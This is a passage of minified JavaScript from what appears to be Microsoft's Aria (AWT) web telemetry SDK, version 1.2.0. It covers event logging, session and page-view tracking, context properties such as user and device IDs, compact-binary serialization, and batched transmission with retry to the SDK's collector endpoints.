t===a.WINDOWS?this.he(e):t===a.MACOSX?this.ve(e):"Unknown"},e.he=function(e){var t=e.match(new RegExp("Windows NT ([\\d,.]+)"));return t&&d[t[1]]?d[t[1]]:"Unknown"},e.ve=function(e){var t=e.match(new RegExp(a.MACOSX+" ([\\d,_,.]+)"));if(t){var i=t[1].replace(/_/g,".");if(i){var n=this.ye(i);if(n){return i.split(n)[0]}return i}}return"Unknown"},e.ye=function(e){return e.indexOf(".")>-1?".":e.indexOf("_")>-1?"_":null},e.ae=function(e,t){if(this.Y)this.Y.setProperty(e,t);else if(this.re){var i=new Date;i.setTime(i.getTime()+31536e6);var n="expires="+i.toUTCString();document.cookie=e+"="+t+"; "+n}},e.se=function(e){if(this.Y)return this.Y.getProperty(e)||"";if(this.re){e+="=";for(var t=document.cookie.split(";"),i=0;i<t.length;i++){for(var n=t[i],r=0;" "===n.charAt(r);)r++;if(n=n.substring(r),0===n.indexOf(e))return n.substring(e.length,n.length)}}return""},e.ne=function(e){this.re&&(document.cookie=e+"=;expires=Thu, 01 Jan 1970 00:00:01 GMT;")},e.ee=!1,e.re="undefined"!=typeof document&&void 0!==document.cookie,e}();t.default=_},function(e,t,i){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var n=i(7),r=i(0),o=i(9),s=function(){function e(e,t){this.Te=e,this.ge=t}return e.prototype.setAppId=function(e){this.me("AppInfo.Id",e)},e.prototype.setAppVersion=function(e){this.me("AppInfo.Version",e)},e.prototype.setAppLanguage=function(e){this.me("AppInfo.Language",e)},e.prototype.setDeviceId=function(e){this.Te&&(n.default.checkAndSaveDeviceId(e),this.me("DeviceInfo.Id",e))},e.prototype.setDeviceOsName=function(e){this.Te&&this.me("DeviceInfo.OsName",e)},e.prototype.setDeviceOsVersion=function(e){this.Te&&this.me("DeviceInfo.OsVersion",e)},e.prototype.setDeviceBrowserName=function(e){this.Te&&this.me("DeviceInfo.BrowserName",e)},e.prototype.setDeviceBrowserVersion=function(e){this.Te&&this.me("DeviceInfo.BrowserVersion",e)},e.prototype.setDeviceMake=function(e){this.Te&&this.me("DeviceInfo.Make",e)},e.prototype.setDeviceModel=function(e){this.Te&&this.me("DeviceInfo.Model",e)},e.prototype.setUserId=function(e,t,i){if(!isNaN(i)&&null!==i&&i>=0&&i<=12)this.me("UserInfo.IdType",i.toString());else{var n=void 0;switch(t){case r.AWTPiiKind.SipAddress:n=o.AWTUserIdType.SipAddress;break;case r.AWTPiiKind.PhoneNumber:n=o.AWTUserIdType.PhoneNumber;break;case r.AWTPiiKind.SmtpAddress:n=o.AWTUserIdType.EmailAddress;break;default:n=o.AWTUserIdType.Unknown}this.me("UserInfo.IdType",n.toString())}if(isNaN(t)||null===t||t===r.AWTPiiKind.NotSet||t>13)switch(i){case o.AWTUserIdType.Skype:t=r.AWTPiiKind.Identity;break;case o.AWTUserIdType.EmailAddress:t=r.AWTPiiKind.SmtpAddress;break;case o.AWTUserIdType.PhoneNumber:t=r.AWTPiiKind.PhoneNumber;break;case o.AWTUserIdType.SipAddress:t=r.AWTPiiKind.SipAddress;break;default:t=r.AWTPiiKind.NotSet}this.Se("UserInfo.Id",e,t)},e.prototype.setUserAdvertisingId=function(e){this.me("UserInfo.AdvertisingId",e)},e.prototype.setUserTimeZone=function(e){this.me("UserInfo.TimeZone",e)},e.prototype.setUserLanguage=function(e){this.me("UserInfo.Language",e)},e.prototype.me=function(e,t){"string"==typeof t&&this.ge.setProperty(e,t)},e.prototype.Se=function(e,t,i){"string"==typeof t&&this.ge.setPropertyWithPii(e,t,i)},e}();t.default=s},function(e,t,i){"use strict";Object.defineProperty(t,"__esModule",{value:!0});!function(e){e[e.Unknown=0]="Unknown",e[e.MSACID=1]="MSACID",e[e.MSAPUID=2]="MSAPUID",e[e.ANID=3]="ANID",e[e.OrgIdCID=4]="OrgIdCID",e[e.OrgIdPUID=5]="OrgIdPUID",e[e.UserObjectId=6]="UserObjectId",e[e.Skype=7]="Skype",e[e.Yammer=8]="Yammer",e[e.EmailAddress=9]="EmailAddress",e[e.PhoneNumber=10]="PhoneNumber",e[e.SipAddress=11]="SipAddress",e[e.MUID=12]="MUID"}(t.AWTUserIdType||(t.AWTUserIdType={}));!function(e){e[e.Started=0]="Started",e[e.Ended=1]="Ended"}(t.AWTSessionState||(t.AWTSessionState={}))},function(e,t,i){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var n=i(1),r=i(2),o=function(){function e(){}return e.initialize=function(e){var t=this;this.Ae=e,this.Ie=!0,r.default.addNotificationListener({eventsSent:function(e){t.Pe("records_sent_count",e.length,e[0].apiKey)},eventsDropped:function(e,i){t.Pe("records_dropped_count",e.length,e[0].apiKey)},eventsRejected:function(e,i){t.Pe("r_count",e.length,e[0].apiKey)},eventsRetrying:null}),setTimeout(function(){return t.flush()},6e4)},e.teardown=function(){this.Ie&&(this.flush(),this.Ie=!1)},e.eventReceived=function(t){e.Pe("records_received_count",1,t)},e.flush=function(){var e=this;if(this.Ie){for(var t in this.We)this.We.hasOwnProperty(t)&&this.Ae(this.We[t],t);this.We={},setTimeout(function(){return e.flush()},6e4)}},e.Pe=function(e,t,i){if(this.Ie&&i!==n.StatsApiKey){var r=n.getTenantId(i);this.We[r]||(this.We[r]={}),this.We[r][e]?this.We[r][e]=this.We[r][e]+t:this.We[r][e]=t}},e.Ie=!1,e.We={},e}();t.default=o},function(e,t,i){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var n=i(0),r=i(12),o=i(13),s=i(3),a=i(2),u=i(7),d=function(){function e(){}return e.initialize=function(e,t){if(void 0===t&&(t={}),!this.Ee)return this.Ee=!0,r.default.defaultTenantToken=e,this.Be(t),this.T.disableCookiesUsage&&!this.T.propertyStorageOverride&&(r.default.sessionEnabled=!1),u.default.addPropertyStorageOverride(this.T.propertyStorageOverride),u.default.autoCollect(r.default.semanticContext,this.T.disableCookiesUsage,this.T.userAgent),s.default.initialize(this.T),r.default.loggingEnabled=!0,this.getLogger()},e.getSemanticContext=function(){return r.default.semanticContext},e.flush=function(e){this.Ee&&!this.Ce&&s.default.flush(e)},e.flushAndTeardown=function(){this.Ee&&!this.Ce&&(this.Ce=!0,s.default.flushAndTeardown(),r.default.loggingEnabled=!1)},e.pauseTransmission=function(){this.Ee&&!this.Ce&&s.default.pauseTransmission()},e.resumeTransmision=function(){this.Ee&&!this.Ce&&s.default.resumeTransmision()},e.setTransmitProfile=function(e){this.Ee&&!this.Ce&&s.default.setTransmitProfile(e)},e.loadTransmitProfiles=function(e){this.Ee&&!this.Ce&&s.default.loadTransmitProfiles(e)},e.setContext=function(e,t,i){void 0===i&&(i=n.AWTPropertyType.Unspecified),r.default.logManagerContext.setProperty(e,t,i)},e.setContextWithPii=function(e,t,i,o){void 0===o&&(o=n.AWTPropertyType.Unspecified),r.default.logManagerContext.setPropertyWithPii(e,t,i,o)},e.prototype.setContextWithCustomerContent=function(e,t,i,o){void 0===o&&(o=n.AWTPropertyType.Unspecified),r.default.logManagerContext.setPropertyWithCustomerContent(e,t,i,o)},e.getLogger=function(e){var t=e;return t&&t!==r.default.defaultTenantToken||(t=""),this.we[e]||(this.we[e]=new o.default(e)),this.we[e]},e.addNotificationListener=function(e){a.default.addNotificationListener(e)},e.Be=function(e){e.collectorUri&&(this.T.collectorUri=e.collectorUri),e.cacheMemorySizeLimitInNumberOfEvents>0&&(this.T.cacheMemorySizeLimitInNumberOfEvents=e.cacheMemorySizeLimitInNumberOfEvents),e.httpXHROverride&&e.httpXHROverride.sendPOST&&(this.T.httpXHROverride=e.httpXHROverride),e.propertyStorageOverride&&e.propertyStorageOverride.getProperty&&e.propertyStorageOverride.setProperty&&(this.T.propertyStorageOverride=e.propertyStorageOverride),e.userAgent&&(this.T.userAgent=e.userAgent),e.disableCookiesUsage&&(this.T.disableCookiesUsage=e.disableCookiesUsage),e.canSendStatEvent&&(this.T.canSendStatEvent=e.canSendStatEvent)},e.we={},e.Ee=!1,e.Ce=!1,e.T={collectorUri:"https://browser.pipe.aria.microsoft.com/Collector/3.0/",cacheMemorySizeLimitInNumberOfEvents:1e4,disableCookiesUsage:!1,canSendStatEvent:function(e){return!0}},e}();t.default=d},function(e,t,i){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var n=i(5),r=i(8),o=function(){function e(){}return e.logManagerContext=new n.default,e.sessionEnabled=!0,e.loggingEnabled=!1,e.defaultTenantToken="",e.semanticContext=new r.default(!0,e.logManagerContext),e}();t.default=o},function(e,t,i){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var n=i(0),r=i(9),o=i(5),s=i(1),a=i(10),u=i(2),d=i(3),_=i(12),l=i(15),c=i(8),p=i(7),f=function(){function e(e){this.be=e,this.De=new o.default,this.$=new c.default(!1,this.De),this.Oe=0,this.Ne()}return e.prototype.setContext=function(e,t,i){void 0===i&&(i=n.AWTPropertyType.Unspecified),this.De.setProperty(e,t,i)},e.prototype.setContextWithPii=function(e,t,i,r){void 0===r&&(r=n.AWTPropertyType.Unspecified),this.De.setPropertyWithPii(e,t,i,r)},e.prototype.setContextWithCustomerContent=function(e,t,i,r){void 0===r&&(r=n.AWTPropertyType.Unspecified),this.De.setPropertyWithCustomerContent(e,t,i,r)},e.prototype.getSemanticContext=function(){return this.$},e.prototype.logEvent=function(t){if(_.default.loggingEnabled){this.be||(this.be=_.default.defaultTenantToken,this.Ne());var i=!0;s.isString(t)?t={name:t}:t instanceof o.default&&(t=t.getEvent(),i=!1),a.default.eventReceived(this.be),e.Re(e.Me(t,this.be),i,this.De)}},e.prototype.logSession=function(t,i){if(_.default.sessionEnabled){var o={name:"session",type:"session",properties:{}};if(e.Ue(o,i),o.priority=n.AWTEventPriority.High,t===r.AWTSessionState.Started){if(this.Oe>0)return;this.Oe=(new Date).getTime(),this.ke=s.newGuid(),this.setContext("Session.Id",this.ke)}else{if(t!==r.AWTSessionState.Ended)return;if(0===this.Oe)return;var a=Math.floor(((new Date).getTime()-this.Oe)/1e3);o.properties["Session.Id"]=this.ke,o.properties["Session.Duration"]=a.toString(),o.properties["Session.DurationBucket"]=e.xe(a),this.Oe=0,this.setContext("Session.Id",null),this.ke=void 0}o.properties["Session.FirstLaunchTime"]=p.default.firstLaunchTime,o.properties["Session.State"]=t.toString(),this.logEvent(o)}},e.prototype.getSessionId=function(){return this.ke},e.prototype.logFailure=function(t,i,r,o,s){if(t&&i){var a={name:"failure",type:"failure",properties:{}};e.Ue(a,s),a.properties["Failure.Signature"]=t,a.properties["Failure.Detail"]=i,r&&(a.properties["Failure.Category"]=r),o&&(a.properties["Failure.Id"]=o),a.priority=n.AWTEventPriority.High,this.logEvent(a)}},e.prototype.logPageView=function(t,i,n,r,o,s){if(t&&i){var a={name:"pageview",type:"pageview",properties:{}};e.Ue(a,s),a.properties["PageView.Id"]=t,a.properties["PageView.Name"]=i,n&&(a.properties["PageView.Category"]=n),r&&(a.properties["PageView.Uri"]=r),o&&(a.properties["PageView.ReferrerUri"]=o),this.logEvent(a)}},e.prototype.Ne=function(){!e.Le[this.be]&&this.be&&(e.Le[this.be]=s.newGuid())},e.Ue=function(e,t){if(t){t instanceof o.default&&(t=t.getEvent()),t.name&&(e.name=t.name),t.priority&&(e.priority=t.priority);for(var i in t.properties)t.properties.hasOwnProperty(i)&&(e.properties[i]=t.properties[i])}},e.xe=function(e){return e<0?"Undefined":e<=3?"UpTo3Sec":e<=10?"UpTo10Sec":e<=30?"UpTo30Sec":e<=60?"UpTo60Sec":e<=180?"UpTo3Min":e<=600?"UpTo10Min":e<=1800?"UpTo30Min":"Above30Min"},e.Re=function(e,t,i){if(!e.name)return void u.default.eventsRejected([e],n.AWTEventsRejectedReason.InvalidEvent);if(e.name=e.name.toLowerCase(),e.name=e.name.replace(s.EventNameDotRegex,"_"),e.type?e.type=e.type.toLowerCase():e.type="custom",!s.EventNameAndTypeRegex.test(e.name)||!s.EventNameAndTypeRegex.test(e.type))return void u.default.eventsRejected([e],n.AWTEventsRejectedReason.InvalidEvent);if(isNaN(e.timestamp)&&(e.timestamp=(new Date).getTime()),t&&e.properties)for(var r in e.properties)e.properties.hasOwnProperty(r)&&(e.properties[r]=s.sanitizeProperty(r,e.properties[r]),null===e.properties[r]&&delete e.properties[r]);e.properties||(e.properties={}),this.Fe(e,i.getPropertyMap()),this.Fe(e,_.default.logManagerContext.getPropertyMap()),this.ze(e,"EventInfo.InitId",this.qe(e.apiKey)),this.ze(e,"EventInfo.Sequence",this.He(e.apiKey)),this.ze(e,"EventInfo.SdkVersion",l.FullVersionString),this.ze(e,"EventInfo.Name",e.name),this.ze(e,"EventInfo.Time",new Date(e.timestamp).toISOString()),s.isPriority(e.priority)||(e.priority=n.AWTEventPriority.Normal),this.je(e)},e.Fe=function(e,t){if(t)for(var i in t)t.hasOwnProperty(i)&&(e.properties[i]||(e.properties[i]=t[i]))},e.ze=function(e,t,i){e.properties[t]={value:i,pii:n.AWTPiiKind.NotSet,type:n.AWTPropertyType.String}},e.je=function(e){d.default.sendEvent(e)},e.Me=function(e,t){var i=e;return i.id=s.newGuid(),i.apiKey=t,i},e.qe=function(t){return e.Le[t]},e.He=function(t){return void 0===e.Ke[t]&&(e.Ke[t]=0),(++e.Ke[t]).toString()},e.Ke={},e.Le={},e}();t.default=f},function(e,t,i){"use strict";Object.defineProperty(t,"__esModule",{value:!0}),t.AWT_REAL_TIME="REAL_TIME",t.AWT_NEAR_REAL_TIME="NEAR_REAL_TIME",t.AWT_BEST_EFFORT="BEST_EFFORT"},function(e,t,i){"use strict";Object.defineProperty(t,"__esModule",{value:!0}),t.Version="1.2.0",t.FullVersionString="AWT-Web-JS-"+t.Version},function(e,t,i){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var n=i(0);t.AWTPropertyType=n.AWTPropertyType,t.AWTPiiKind=n.AWTPiiKind,t.AWTEventPriority=n.AWTEventPriority,t.AWTEventsDroppedReason=n.AWTEventsDroppedReason,t.AWTEventsRejectedReason=n.AWTEventsRejectedReason,t.AWTCustomerContentKind=n.AWTCustomerContentKind;var r=i(9);t.AWTUserIdType=r.AWTUserIdType,t.AWTSessionState=r.AWTSessionState;var o=i(14);t.AWT_BEST_EFFORT=o.AWT_BEST_EFFORT,t.AWT_NEAR_REAL_TIME=o.AWT_NEAR_REAL_TIME,t.AWT_REAL_TIME=o.AWT_REAL_TIME;var s=i(5);t.AWTEventProperties=s.default;var a=i(13);t.AWTLogger=a.default;var u=i(11);t.AWTLogManager=u.default;var d=i(29);t.AWTTransmissionManager=d.default;var _=i(6);t.AWTSerializer=_.default;var l=i(8);t.AWTSemanticContext=l.default,t.AWT_COLLECTOR_URL_UNITED_STATES="https://us.pipe.aria.microsoft.com/Collector/3.0/",t.AWT_COLLECTOR_URL_GERMANY="https://de.pipe.aria.microsoft.com/Collector/3.0/",t.AWT_COLLECTOR_URL_JAPAN="https://jp.pipe.aria.microsoft.com/Collector/3.0/",t.AWT_COLLECTOR_URL_AUSTRALIA="https://au.pipe.aria.microsoft.com/Collector/3.0/",t.AWT_COLLECTOR_URL_EUROPE="https://eu.pipe.aria.microsoft.com/Collector/3.0/"},function(e,t,i){"use strict";Object.defineProperty(t,"__esModule",{value:!0});!function(e){e[e.Qe=0]="_BT_STOP",e[e.Ve=1]="_BT_STOP_BASE",e[e.Q=2]="_BT_BOOL",e[e.G=8]="_BT_DOUBLE",e[e.R=9]="_BT_STRING",e[e.x=10]="_BT_STRUCT",e[e.M=11]="_BT_LIST",e[e.D=13]="_BT_MAP",e[e.j=16]="_BT_INT32",e[e.L=17]="_BT_INT64"}(t.O||(t.O={}))},function(e,t,i){"use strict";function n(e){for(var t=[],i=0;i<e.length;++i){var n=e.charCodeAt(i);n<128?t.push(n):n<2048?t.push(192|n>>6,128|63&n):n<55296||n>=57344?t.push(224|n>>12,128|n>>6&63,128|63&n):(n=65536+((1023&n)<<10|1023&e.charCodeAt(++i)),t.push(240|n>>18,128|n>>12&63,128|n>>6&63,128|63&n))}return t}function r(e){for(var t="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",i=[],n=e.length%3,r=0,o=e.length-n;r<o;r+=3){var s=(e[r]<<16)+(e[r+1]<<8)+e[r+2];i.push(function(e){return[t.charAt(e>>18&63),t.charAt(e>>12&63),t.charAt(e>>6&63),t.charAt(63&e)].join("")}(s))}switch(n){case 1:var s=e[e.length-1];i.push(t.charAt(s>>2)),i.push(t.charAt(s<<4&63)),i.push("==");break;case 2:var a=(e[e.length-2]<<8)+e[e.length-1];i.push(t.charAt(a>>10)),i.push(t.charAt(a>>4&63)),i.push(t.charAt(a<<2&63)),i.push("=")}return i.join("")}function o(e){for(var t=[];4294967168&e;)t.push(127&e|128),e>>>=7;return t.push(127&e),t}function s(e){for(var t=e.low,i=e.high,n=[];i||4294967168&t;)n.push(127&t|128),t=(127&i)<<25|t>>>7,i>>>=7;return n.push(127&t),n}function a(e){if(c.BrowserChecker.Ge()){var t=new DataView(new ArrayBuffer(8));t.setFloat64(0,e,!0);for(var i=[],n=0;n<8;++n)i.push(t.getUint8(n));return i}return l.FloatUtils.Xe(e,!0)}function u(e){return(e=_.Number.B(e))<<1^e>>31}function d(e){var t=e.low,i=e.high,n=i<<1|t>>>31,r=t<<1;2147483648&i&&(n=~n,r=~r);var o=new _.UInt64("0");return o.low=r,o.high=n,o}Object.defineProperty(t,"__esModule",{value:!0});var _=i(4),l=i(19),c=i(22);t.Ze=n,t.Z=r,t.Je=o,t.Ye=s,t.$e=a,t.et=u,t.tt=d},function(e,t,i){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var n=function(){function e(){}return e.Xe=function(e,t){if(!e)return t?this.it:this.nt;var i=t?11:8,n=t?52:23,r=(1<<i-1)-1,o=1-r,s=r,a=e<0?1:0;e=Math.abs(e);for(var u=Math.floor(e),d=e-u,_=2*(r+2)+n,l=new Array(_),c=0;c<_;)l[c++]=0;for(c=r+2;c&&u;)l[--c]=u%2,u=Math.floor(u/2);for(c=r+1;c<_-1&&d>0;)d*=2,d>=1?(l[++c]=1,--d):l[++c]=0;for(var p=0;p<_&&!l[p];)p++;var f=r+1-p,h=p+n;if(l[h+1]){for(c=h;c>p&&(l[c]=1-l[c],!l);--c);c===p&&++f}if(f>s||u)return a?t?this.rt:this.ot:t?this.st:this.at;if(f<o)return t?this.it:this.nt;if(t){var v=0;for(c=0;c<20;++c)v=v<<1|l[++p];for(var y=0;c<52;++c)y=y<<1|l[++p];v|=f+r<<20,v=a<<31|2147483647&v;var T=[255&y,y>>8&255,y>>16&255,y>>>24,255&v,v>>8&255,v>>16&255,v>>>24];return T}var g=0;for(c=0;c<23;++c)g=g<<1|l[++p];g|=f+r<<23,g=a<<31|2147483647&g;var T=[255&g,g>>8&255,g>>16&255,g>>>24];return T},e.nt=[0,0,0,0],e.it=[0,0,0,0,0,0,0,0],e.at=[0,0,128,127],e.ot=[0,0,128,255],e.st=[0,0,0,0,0,0,240,127],e.rt=[0,0,0,0,0,0,240,255],e}();t.FloatUtils=n},function(e,t,i){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var n=i(4),r=function(){function e(){this.ut=[]}return e.prototype.dt=function(e){this.ut.push(n.Number.P(e))},e.prototype._t=function(e,t,i){for(;i--;)this.dt(e[t++])},e.prototype.H=function(){return this.ut},e}();t.MemoryStream=r},function(e,t,i){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var n=i(17);t.O=n.O;var r=i(18);t.J=r;var o=i(20);t.IO=o;var s=i(4);t.Int64=s.Int64,t.UInt64=s.UInt64,t.Number=s.Number;var a=function(){function e(e){this.lt=e}return e.prototype.z=function(e){this.lt._t(e,0,e.length)},e.prototype.V=function(e){this.lt.dt(e?1:0)},e.prototype.k=function(e,t){this.ct(t),this.pt(e)},e.prototype.N=function(e,t,i){this.ct(t),this.ct(i),this.pt(e)},e.prototype.X=function(e){var t=r.$e(e);this.lt._t(t,0,t.length)},e.prototype.b=function(e,t,i){t<=5?this.lt.dt(e|t<<5):t<=255?(this.lt.dt(192|e),this.lt.dt(t)):(this.lt.dt(224|e),this.lt.dt(t),this.lt.dt(t>>8))},e.prototype.K=function(e){e=r.et(e),this.pt(e)},e.prototype.F=function(e){this.ft(r.tt(e))},e.prototype.U=function(e){if(""===e)this.pt(0);else{var t=r.Ze(e);this.pt(t.length),this.lt._t(t,0,t.length)}},e.prototype.q=function(e){this.ct(e?n.O.Ve:n.O.Qe)},e.prototype.pt=function(e){var t=r.Je(s.Number.C(e));this.lt._t(t,0,t.length)},e.prototype.ft=function(e){var t=r.Ye(e);this.lt._t(t,0,t.length)},e.prototype.ct=function(e){this.lt.dt(s.Number.W(e))},e}();t.CompactBinaryProtocolWriter=a},function(e,t,i){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var n=function(){function e(){}return e.Ge=function(){return"undefined"!=typeof ArrayBuffer&&"undefined"!=typeof DataView},e}();t.BrowserChecker=n},function(e,t,i){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var n=function(){function e(){this.ht=!0,this.vt=!0,this.yt=!0,this.Tt="use-collector-delta",this.gt=!1}return e.prototype.allowRequestSending=function(){return this.yt?(this.yt=!1,this.ht=!1,!0):this.ht},e.prototype.shouldAddClockSkewHeaders=function(){return this.vt},e.prototype.getClockSkewHeaderValue=function(){return this.Tt},e.prototype.setClockSkew=function(e){this.gt||(e?this.Tt=e:this.vt=!1,this.gt=!0,this.ht=!0)},e}();t.default=n},function(e,t,i){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var n=function(){function e(){this.mt={}}return e.prototype.setKillSwitchTenants=function(e,t){if(e&&t)try{var i=e.split(",");if("this-request-only"===t)return i;for(var n=1e3*parseInt(t,10),r=0;r<i.length;++r)this.mt[i[r]]=Date.now()+n}catch(e){return[]}return[]},e.prototype.isTenantKilled=function(e){return void 0!==this.mt[e]&&this.mt[e]>Date.now()||(delete this.mt[e],!1)},e}();t.default=n},function(e,t,i){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var n=i(2),r=i(0),o=function(){function e(e,t){this.St=e,this.At=t,this.It={},this.Pt=0}return e.prototype.addEventToBatch=function(e){e.serializedEvent.length>this.St?n.default.eventsRejected([e],r.AWTEventsRejectedReason.SizeLimitExceeded):(this.Pt+e.serializedEvent.length>this.St&&this.flushBatch(),void 0===this.It[e.apiKey]&&(this.It[e.apiKey]=[]),this.It[e.apiKey].push(e),this.Pt+=e.serializedEvent.length)},e.prototype.flushBatch=function(){this.Pt>0&&(this.At.push(this.It),this.It={},this.Pt=0)},e.prototype.hasBatch=function(){return this.Pt>0},e}();t.default=o},function(e,t,i){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var n=function(){function e(){}return e.shouldRetryForStatus=function(e){return!(e>=300&&e<500&&408!==e||501===e||505===e)},e.getMillisToBackoffForRetry=function(e){var t=0,i=Math.floor(1200*Math.random())+2400;return t=Math.pow(4,e)*i,Math.min(t,12e4)},e}();t.default=n},function(e,t,i){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var n=i(0),r=i(6),o=i(26),s=i(24),a=i(23),u=i(15),d=i(1),_=i(2),l=i(3),c="POST",p=function(){function e(e,t,i,n){var r=this;this.Wt=e,this.Et=i,this.Bt=n,this.Ct="?qsp=true&content-type=application%2Fbond-compact-binary&client-id=NO_AUTH&sdk-version="+u.FullVersionString,this.wt=new s.default,this._=!1,this.bt=new a.default,this.Dt=!1,this.Ot=0,d.isUint8ArrayAvailable()||(this.Ct+="&content-encoding=base64"),this.Ct=t+this.Ct,this.Bt||(this.Dt=!d.isReactNative(),this.Bt={sendPOST:function(e,t,i,n,o,s){if(d.useXDomainRequest()){var a=new XDomainRequest;a.open(c,e),a.onload=function(){o(200,null)},a.onerror=function(){n(400,null)},a.ontimeout=function(){i(500,null)},a.send(t)}else if(d.isReactNative())fetch(e,{body:t,method:c}).then(function(e){var t={};e.headers&&e.headers.forEach(function(e,i){t[i]=e}),o(e.status,t)}).catch(function(e){n(0,{})});else{var u=new XMLHttpRequest;u.open(c,e,!s),u.onload=function(){o(u.status,r.Nt(u.getAllResponseHeaders()))},u.onerror=function(){n(u.status,r.Nt(u.getAllResponseHeaders()))},u.ontimeout=function(){i(u.status,r.Nt(u.getAllResponseHeaders()))},u.send(t)}}})}return e.prototype.hasIdleConnection=function(){return this.Ot<2},e.prototype.sendQueuedRequests=function(){for(;this.hasIdleConnection()&&!this._&&this.Wt.length>0&&this.bt.allowRequestSending();)this.Ot++,this.Rt(this.Wt.pop(),0,!1);this.hasIdleConnection()&&l.default.scheduleTimer()},e.prototype.isCompletelyIdle=function(){return 0===this.Ot},e.prototype.flush=function(){for(;this.Wt.length>0;)this.Rt(this.Wt.pop(),0,!0)},e.prototype.pause=function(){this._=!0},e.prototype.resume=function(){this._=!1,this.sendQueuedRequests()},e.prototype.removeQueuedRequests=function(){this.Wt.length=0},e.prototype.Rt=function(e,t,i){var o=this;if(this._)return this.Ot--,void this.Et.addBackRequest(e);var s=0,a="";for(var u in e)e.hasOwnProperty(u)&&(this.wt.isTenantKilled(u)?(_.default.eventsDropped(e[u],n.AWTEventsDroppedReason.KillSwitch),delete e[u]):(a.length>0&&(a+=","),a+=u,s++));if(s>0){var l=r.default.getPayloadBlob(e,s),c=this.Ct+"&x-apikey="+a+"&client-time-epoch-millis="+Date.now().toString();this.bt.shouldAddClockSkewHeaders()&&(c=c+"&time-delta-to-apply-millis="+this.bt.getClockSkewHeaderValue());var p=void 0;p=d.isUint8ArrayAvailable()?new Uint8Array(l):r.default.base64Encode(l),this.Dt&&i&&d.isBeaconsSupported()?navigator.sendBeacon(c,p):this.Bt.sendPOST(c,p,function(i,n){o.Mt(i,n,e,s,a,t)},function(i,n){o.Mt(i,n,e,s,a,t)},function(i,n){o.Mt(i,n,e,s,a,t)},!1)}else i||this.Ut(null,{})},e.prototype.Mt=function(e,t,i,r,s,a){var u=this,d=!0;if(void 0!==e){if(t){var c=this.wt.setKillSwitchTenants(t["kill-tokens"],t["kill-duration-seconds"]);this.bt.setClockSkew(t["time-delta-millis"]);for(var p=0;p<c.length;++p)_.default.eventsDropped(i[c[p]],n.AWTEventsDroppedReason.KillSwitch),delete i[c[p]],r--}else this.bt.setClockSkew(null);if(200===e)return void this.Ut(!0,i);(!o.default.shouldRetryForStatus(e)||r<=0)&&(d=!1)}if(d)if(a<1){for(var f in i)i.hasOwnProperty(f)&&_.default.eventsRetrying(i[f]);setTimeout(function(){return u.Rt(i,a+1,!1)},o.default.getMillisToBackoffForRetry(a))}else this.Ot--,l.default.backOffTransmission(),this.Et.addBackRequest(i);else this.Ut(!1,i)},e.prototype.Ut=function(e,t){e&&l.default.clearBackOff();for(var i in t)t.hasOwnProperty(i)&&(e?_.default.eventsSent(t[i]):_.default.eventsDropped(t[i],n.AWTEventsDroppedReason.NonRetryableStatus));this.Ot--,this.sendQueuedRequests()},e.prototype.Nt=function(e){var t={};if(e)for(var i=e.split("\n"),n=0;n<i.length;++n){var r=i[n].split(": ");t[r[0]]=r[1]}return t},e}();t.default=p},function(e,t,i){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var n=i(0),r=i(27),o=i(3),s=i(25),a=i(6),u=i(2),d=2936012,_=function(){function e(e,t,i){this.kt=t,this.xt=!1,this.Lt=[],this.Ft=!1,this._=!1,this.zt=0,this.At=[],this.qt={},this.qt[n.AWTEventPriority.High]=[],this.qt[n.AWTEventPriority.Normal]=[],this.qt[n.AWTEventPriority.Low]=[],this.Ht(),this.jt=new s.default(d,this.At),this.Kt=new r.default(this.At,e,this,i)}return e.prototype.addEvent=function(e){this.zt<this.kt?this._&&this.Ft||(this.zt++,this.qt[e.priority][this.qt[e.priority].length-1].push(e)):u.default.eventsDropped([e],n.AWTEventsDroppedReason.QueueFull)},e.prototype.sendEventsForPriorityAndAbove=function(e){this.Qt(e),this.Kt.sendQueuedRequests()},e.prototype.hasEvents=function(){return(this.qt[n.AWTEventPriority.High][0].length>0||this.qt[n.AWTEventPriority.Normal][0].length>0||this.qt[n.AWTEventPriority.Low][0].length>0||this.jt.hasBatch())&&this.Kt.hasIdleConnection()},e.prototype.addBackRequest=function(e){if(!this._||!this.Ft){for(var t in e)if(e.hasOwnProperty(t))for(var i=0;i<e[t].length;++i)this.addEvent(e[t][i]);o.default.scheduleTimer()}},e.prototype.teardown=function(){this._||(this.Qt(n.AWTEventPriority.Low),this.Kt.flush())},e.prototype.uploadNow=function(e){var t=this;this.Ht(),this.xt?this.Lt.push(e):(this.xt=!0,setTimeout(function(){return t.Vt(e)},0))},e.prototype.pauseTransmission=function(){this._=!0,this.Kt.pause(),this.shouldDropEventsOnPause&&(this.zt-=this.qt[n.AWTEventPriority.High][0].length+this.qt[n.AWTEventPriority.Normal][0].length+this.qt[n.AWTEventPriority.Low][0].length,this.qt[n.AWTEventPriority.High][0]=[],this.qt[n.AWTEventPriority.Normal][0]=[],this.qt[n.AWTEventPriority.Low][0]=[],this.Kt.removeQueuedRequests())},e.prototype.resumeTransmission=function(){this._=!1,this.Kt.resume()},e.prototype.shouldDropEventsOnPause=function(e){this.Ft=e},e.prototype.Gt=function(){this.qt[n.AWTEventPriority.High].shift(),this.qt[n.AWTEventPriority.Normal].shift(),this.qt[n.AWTEventPriority.Low].shift()},e.prototype.Ht=function(){this.qt[n.AWTEventPriority.High].push([]),this.qt[n.AWTEventPriority.Normal].push([]),this.qt[n.AWTEventPriority.Low].push([])},e.prototype.Qt=function(e){for(var t=n.AWTEventPriority.High;t>=e;){for(;this.qt[t][0].length>0;){var 